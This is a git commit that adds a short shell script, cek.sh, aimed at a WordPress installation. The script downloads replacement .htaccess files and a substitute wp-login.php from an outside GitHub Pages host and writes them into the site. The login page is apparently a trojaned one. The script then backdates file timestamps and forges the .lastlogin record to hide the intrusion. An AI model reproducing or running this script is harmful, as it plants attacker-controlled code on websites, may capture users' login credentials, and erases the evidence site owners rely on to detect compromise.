7a19fba0c32463671527b87940d6c405f12b5222
DarkSeoTR <54660443+DarkSeoTR@users.noreply.github.com>
2019-10-22 05:42:16 +0300

    Create cek.sh

---
+++ cek.sh
@@ -0,0 +1,11 @@
+wget https://darkseotr.github.io/phpengelle.txt -O /public_html/wp-includes/.htaccess
+wget https://darkseotr.github.io/phpengelle.txt -O /public_html/wp-content/.htaccess
+rm -rf /public_html/wp-login.php 
+wget https://darkseotr.github.io/wp-login.txt -O /public_html/wp-login.php
+touch -t "2019-09-26" /public_html/wp-content/
+touch -t "2019-09-26" /public_html/wp-includes/
+touch -t "2019-09-26" /public_html/*
+touch -t "2019-09-26" /public_html/
+rm -rf .lastlogin
+echo "176.88.68.250 # 2019-09-26 18:57:06 +0300" > .lastlogin
+touch -t "2019-09-26" *
